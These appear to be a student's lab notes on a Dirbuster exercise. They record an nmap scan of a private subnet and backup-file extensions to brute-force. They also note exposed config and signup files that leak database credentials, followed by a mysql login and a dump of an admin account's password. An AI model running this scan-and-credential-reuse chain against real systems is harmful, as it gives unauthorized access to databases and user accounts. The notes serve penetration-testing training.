# Dirbuster Lab Notes

My IP: `10.104.11.50`

1. Scan network
	- `nmap 10.104.11.0/24`

### Pingable IPs
- `10.104.11.96`
	- Ports open: 22, 80
	- **Web Server**
- `10.104.11.198`
	- Ports open: 22, 3306
	- MySQL?
---
- File extensions to use with dirbuster:
	- `.old, .bak, .xxx`

- Files found:
	- http://10.104.11.96/include/config.old
		- Contains SQL creds:
			- `awd:UcuicjsQgG0FILdjdL8D`
	- http://10.104.11.96/staff/readme.txt
	- http://10.104.11.96/signup.php
		- ```
			@Dev team: the DB credentials are
			Username:   awdmgmt
			Password:   UChxKQk96dVtM07
			Host:       10.104.11.198
			DB:         awdmgmt_accounts
			DMBS:       MySQL
			```
Connect to given DB: `mysql -h 10.104.11.198 -u awdmgmt -pUChxKQk96dVtM07`

We're in!
```bash
MySQL [(none)]> use awdmgmt_accounts
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [awdmgmt_accounts]> show tables;
+----------------------------+
| Tables_in_awdmgmt_accounts |
+----------------------------+
| accounts                   |
+----------------------------+
1 row in set (0.043 sec)

MySQL [awdmgmt_accounts]> select * from accounts;
+----+--------------------+----------+-------------+
| id | email              | password | displayname |
+----+--------------------+----------+-------------+
|  1 | admin@awdmgmt.labs | ENS7VvW8 | Admin       |
+----+--------------------+----------+-------------+
1 row in set (0.047 sec)
```
